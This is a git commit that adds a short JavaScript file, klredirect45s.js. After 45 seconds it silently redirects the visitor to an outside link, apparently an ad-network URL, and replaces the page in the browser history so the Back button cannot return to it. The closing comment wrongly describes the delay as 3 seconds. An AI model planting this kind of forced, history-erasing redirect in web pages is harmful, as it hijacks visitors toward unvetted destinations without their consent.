a5c396d535b8c6d306dd45a24525cd0ec29d2bca
dexamax <166790203+dexamax@users.noreply.github.com>
2025-06-06 21:29:09 +0530

    Create klredirect45s.js

---
+++ klredirect45s.js
@@ -0,0 +1,6 @@
+
+        // Set a timeout for redirecting
+        setTimeout(function() {
+            // Redirect to the specified URL and replace the current page in the history stack
+            window.location.replace("https://otieu.com/4/9421366");  // Redirect to the URL
+        }, 45000);  // 3000 milliseconds = 3 seconds
